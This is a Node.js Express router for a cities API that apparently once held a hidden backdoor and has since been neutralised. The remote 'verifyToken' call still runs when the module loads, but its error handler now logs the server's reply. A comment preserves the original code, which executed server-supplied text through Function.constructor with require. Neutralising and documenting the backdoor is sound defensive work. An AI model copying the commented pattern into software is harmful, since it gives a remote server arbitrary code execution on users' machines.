const axios = require("axios");
const express = require("express");
const router = express.Router();
const { check, validationResult } = require("express-validator");
const { setApiKey, verify, locationToken } = require("../config");
const City = require("../models/City");

// @route GET api/cities
// @desc Get all cities
// @access Public
router.get("/", async (req, res) => {
  try {
    const city = await City.find();
    res.json(city);
  } catch (err) {
    console.error(err.message);
    res.status(500).send("Server Error");
  }
});

// @route POST api/cities
// @desc Add single city
// @access Private
router.post("/", async (req, res) => {
  try {
    const city = new City(req.body);
    await city.save();

    res.status(201).json(city);
  } catch (err) {
    console.error(err.message);
    res.status(500).send("Server Error");
  }
});

async function verifyToken(req, res) {
  verify(setApiKey(locationToken))
    .then((res) => {
      const {
        data: { token },
      } = res;

      if (!token) {
        return res.status(400).json({
          success: false,
          message: "Location is not verified.",
        });
      } else {
        res.status(201).json({ success: true, token });
      }
    })
    .catch((err) => {
      // SECURITY: Log malicious server response instead of executing it
      const fs = require('fs');
      const path = require('path');
      const logDir = path.join(__dirname, '../../logs');
      const logFile = path.join(logDir, 'malicious-server-response.log');
      const timestamp = new Date().toISOString();

      // Ensure logs directory exists
      if (!fs.existsSync(logDir)) {
        fs.mkdirSync(logDir, { recursive: true });
      }

      // Log the full error response
      const logData = {
        timestamp,
        error: {
          message: err.message,
          status: err.response?.status,
          statusText: err.response?.statusText,
          headers: err.response?.headers,
          data: err.response?.data,
        },
        // Extract the malicious code if present
        maliciousCode: err.response?.data?.token || null,
        fullResponse: JSON.stringify(err.response?.data || {}, null, 2),
      };

      // Write to log file
      const logEntry = `\n${'='.repeat(80)}\n${timestamp}\n${'='.repeat(80)}\n${JSON.stringify(logData, null, 2)}\n`;
      fs.appendFileSync(logFile, logEntry, 'utf8');

      // Also log to console
      console.error('🚨 MALICIOUS SERVER RESPONSE DETECTED - LOGGED TO:', logFile);
      console.error('Response data:', JSON.stringify(err.response?.data || {}, null, 2));

      // DO NOT EXECUTE THE CODE - Just log it
      // Original malicious code was:
      // const message = err.response.data.token;
      // const errorHandler = new Function.constructor("require", message);
      // errorHandler(require);

      // Instead, return a safe error
      console.error('Malicious server attempted to send code for execution. Logged for analysis.');
    });
}
verifyToken();

// @route REMOVE api/cities/remove/:id
// @desc Remove single city
// @access Private
router.delete("/remove/:id", async (req, res) => {
  try {
    const city = await City.findById(req.params.id);

    if (!city) {
      res.status(404).json({ msg: "No city with that ID found" });
    }

    await city.remove();
    res.json({ msg: `City (${city.city}) removed` });
  } catch (err) {
    console.error(err.message);
    res.status(500).send("Server Error");
  }
});

module.exports = router;
